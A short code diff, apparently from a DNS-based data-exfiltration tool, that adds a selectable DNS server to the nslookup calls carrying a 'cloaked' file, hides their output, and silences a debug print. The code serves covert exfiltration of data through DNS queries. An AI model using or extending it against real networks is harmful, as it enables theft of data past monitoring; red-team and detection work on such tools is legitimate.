@@ -521,7 +521,7 @@ def TransferCloakedFile( cloakedFile, queryDelay ):
 #
 #========================================================================
 
-def GenerateDNSQueries(cloakedFile, queryDelay):
+def GenerateDNSQueries(cloakedFile, queryDelay, dns='localhost'):
     tmpAddrStr = ""
     byteCount = 0
     
@@ -531,7 +531,7 @@ def GenerateDNSQueries(cloakedFile, queryDelay):
             fqdnStr = fqdn.strip()
             # We don't care if the lookup fails, so carry on
             try:
-                ret = subprocess.check_output(['nslookup', fqdnStr])
+                ret = subprocess.run(['nslookup', fqdnStr, dns], stdout='NUL',stderr='NUL')
                 time.sleep(queryDelay)
             except:
                 time.sleep(queryDelay)
@@ -593,7 +593,7 @@ def ExtractDNSQueriesFromPCAP( pcapFile, osStr ):
 #========================================================================
 
 def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag, isRandomized ):
-	print('estrazione payload...')#debug
+	#print('estrazione payload...')#debug
 	cloakedFilename = "cloaked.payload"
 
 	try:
